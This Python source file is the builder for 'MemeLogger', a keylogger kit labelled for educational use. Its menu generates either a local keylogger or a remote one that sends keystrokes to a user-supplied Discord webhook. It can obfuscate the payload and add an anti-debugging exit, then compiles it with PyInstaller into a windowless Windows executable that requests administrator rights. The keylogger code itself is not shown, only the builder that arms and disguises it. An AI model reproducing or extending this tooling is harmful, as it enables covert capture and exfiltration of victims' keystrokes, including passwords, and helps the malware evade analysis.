# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                  MemeLogger                                 #
#                          ! EDUCATIONAL PURPOSES ONLY !                      #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

import os
import sys
import crypter
import subprocess
from colorama import init, Fore

init(autoreset=True)
python_file = ""
output_dir = r".\output"


def build():
    os.system("cls")
    print(f"{Fore.GREEN}Start building...\n")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    try:
        subprocess.run(
            [
                "python",
                "-m",
                "pyinstaller",
                "--onefile",
                "--disable-windowed-traceback",
                "--uac-admin",
                "-n",
                "Memelogger",
                f"--icon={os.path.join(os.path.dirname(os.path.abspath(__file__)), 'icon', 'icon.ico')}",
                "--distpath",
                output_dir,
                "--workpath",
                os.path.join(output_dir, "build"),
                "--specpath",
                os.path.join(output_dir, "specs"),
                python_file,
                "-w",
            ],
            check=True,
        )
    except subprocess.CalledProcessError:
        print(f"{Fore.LIGHTRED_EX}Failed to build {os.path.abspath(python_file)}")
        input("Press enter to exit...")
        sys.exit(1)
    print(f"\n{Fore.GREEN}Build completed successfully.{Fore.RESET}")
    print(f"{Fore.GREEN}Output directory: {os.path.abspath(output_dir)}{Fore.RESET}")
    input("Press enter to exit...")
    sys.exit(0)


def main():
    global python_file
    while True:
        os.system("cls")
        print(
            f"{Fore.LIGHTRED_EX}                                                 $$\\                                                   "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                 $$ |                                                  "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$$$$$\\$$$$\\   $$$$$$\\  $$$$$$\\$$$$\\   $$$$$$\\  $$ | $$$$$$\\   $$$$$$\\   $$$$$$\\   $$$$$$\\   $$$$$$\\  "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$  _$$  _$$\\ $$  __$$\\ $$  _$$  _$$\\ $$  __$$\\ $$ |$$  __$$\\ $$  __$$\\ $$  __$$\\ $$  __$$\\ $$  __$$\\ "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ / $$ / $$ |$$$$$$$$ |$$ / $$ / $$ |$$$$$$$$ |$$ |$$ /  $$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ |  \\__|"
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ | $$ | $$ |$$   ____|$$ | $$ | $$ |$$   ____|$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |      "
        )
        print(
            f"{Fore.LIGHTRED_EX} $$ | $$ | $$ |\\$$$$$$$\\ $$ | $$ | $$ |\\$$$$$$$\\ $$ |\\$$$$$$  |\\$$$$$$$ |\\$$$$$$$ |\\$$$$$$$\\ $$ |      "
        )
        print(
            f"{Fore.LIGHTRED_EX} \\__| \\__| \\__| \\_______|\\__| \\__| \\__| \\_______|\\__| \\______/  \\____$$ | \\____$$ | \\_______|\\__|      "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                               $$\\   $$ |$$\\   $$ |                    "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                               \\$$$$$$  |\\$$$$$$  |                    "
        )
        print(
            f"{Fore.LIGHTRED_EX}                                                                \\______/  \\______/                     "
        )
        print(
            f"\n{Fore.LIGHTYELLOW_EX}1{Fore.RESET} - {Fore.LIGHTGREEN_EX}remote keylogger (discord webhook)"
        )
        print(
            f"{Fore.LIGHTYELLOW_EX}2{Fore.RESET} - {Fore.LIGHTGREEN_EX}local keylogger"
        )
        print(f"{Fore.LIGHTYELLOW_EX}3{Fore.RESET} - {Fore.LIGHTGREEN_EX}exit")
        choice = input("\nEnter your choice: ")
        try:
            choice = int(choice)
        except ValueError:
            print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
            input("Press enter to continue...")
            os.system("cls")
            continue
        if choice == 1:
            url = input("\nEnter your Discord webhook URL: ")
            if url.strip() == "":
                print("\nPlease enter your Discord webhook URL!")
                input("Press enter to continue...")
                os.system("cls") 
                continue
            discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "keylogger.py")
            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
            with open(discord_file, "r", encoding="utf-8") as f:
                content = f.read()
            encrypt = input("Encrypt code [y/n]: ")
            if encrypt.lower().strip() == "y" or encrypt.lower().strip() == "yes":
                content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content.replace("YOUR_WEBHOOK_URL", url))
            elif encrypt.lower().strip() == "n" or encrypt.lower().strip() == "no":
                pass
            else:
                print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
                input("Press enter to continue...")
                os.system("cls")
                continue
            with open(python_file, "w", encoding="utf-8") as f:
                f.write(content)
            build()
            try:
                os.remove(python_file)
            except (FileNotFoundError, PermissionError):
                pass
            break
        elif choice == 2:
            local_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "local", "keylogger.py")
            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
            with open(local_file, "r", encoding="utf-8") as f:
                content = f.read()
            encrypt = input("Encrypt code [y/n]: ")
            if encrypt.lower().strip() == "y" or encrypt.lower().strip() == "yes":
                content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content)
            elif encrypt.lower().strip() == "n" or encrypt.lower().strip() == "no":
                pass
            else:
                print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
                input("Press enter to continue...")
                os.system("cls")
                continue
            with open(python_file, "w", encoding="utf-8") as f:
                f.write(content)
            build()
            break
        elif choice == 3:
            break
        else:
            print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
            input("Press enter to continue...") 
            os.system("cls")
            continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
